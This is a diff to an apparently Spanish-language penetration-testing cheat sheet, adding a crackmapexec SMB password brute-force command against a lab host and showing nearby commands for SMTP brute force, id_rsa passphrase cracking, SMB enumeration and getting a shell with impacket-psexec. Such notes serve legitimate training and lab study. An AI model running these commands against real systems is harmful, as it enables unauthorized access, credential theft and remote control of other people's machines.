@@ -389,6 +389,8 @@ python brut3k1t.py -s smtp -a smtp.gmail.com -u test@gmail.com -w word list.txt 
 
 RSAcrack -w /opt/techyou.txt -k id_rsa ---> crackear passphrase de archivo id_rsa
 
+crackmapexec smb target.ine.local -u tom -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt --> fuerza bruta SMB
+
 
 SMB
 ....
@@ -405,7 +407,7 @@ smbclient -L IP -N
 
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP]
 smbmap -H [IP]
-smbmap -H [IP] -u [user] -p [password] -- probar usuario y una única contraseña para ver recursos compartidos
+smbmap -H [IP] -u [user] -p [password] --> probar usuario y contraseña para ver recursos compartidos
 nmap -p445 --script smb-security-mode [IP] --> nmap script to find the smb protocol security level.
 nmap -p445 --script smb-protocols [IP] --> Identificar versiones de SMB permitidas
 impacket-psexec test.local/user:pass@[IP] --> obtener shell con credenciales conocidas y SMB abierto 
